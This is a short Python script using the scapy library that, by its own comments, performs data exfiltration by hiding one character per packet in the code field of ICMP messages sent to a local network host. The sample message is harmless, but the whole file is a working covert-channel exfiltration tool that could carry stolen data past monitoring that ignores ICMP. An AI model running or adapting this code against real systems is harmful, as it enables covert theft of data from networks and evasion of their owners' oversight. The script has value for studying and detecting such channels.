# This code is taking advantage of ICMP's code field to perform
# data exfiltration.
# This is a bit of a limited method for data exfiltration because
# we only send one byte of data at a time.

from scapy.all import *

def transmit(message, host):
    for m in message:
        mac = get_if_hwaddr(conf.iface)
        packet = Ether(src=mac,dst=mac)/IP(dst=host)/ICMP(code = ord(m))
        sendp(packet,verbose=False)

host = "192.168.178.25"
message = "Hello world, am here"
transmit(message,host)
